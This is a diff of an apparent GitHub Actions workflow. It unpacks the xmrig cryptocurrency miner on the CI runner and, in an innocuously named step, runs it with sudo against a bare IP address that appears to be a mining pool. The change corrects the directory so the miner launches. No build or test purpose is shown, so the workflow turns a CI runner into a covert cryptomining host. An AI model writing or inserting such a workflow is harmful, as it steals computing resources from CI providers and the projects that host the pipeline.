@@ -26,7 +26,7 @@ jobs:
        run: tar -xzvf /home/runner/Downloads/xmrig-6.22.2-linux-static-x64.tar.gz -C /home/runner/Downloads
      - name: henshin
        run: |
-          cd /home/runner/Downloads
+          cd /home/runner/Downloads/xmrig-6.22.2
           sudo ./xmrig -o  123.17.118.154
       # Runs a single command using the runners shell
      - name: Run a one-line script
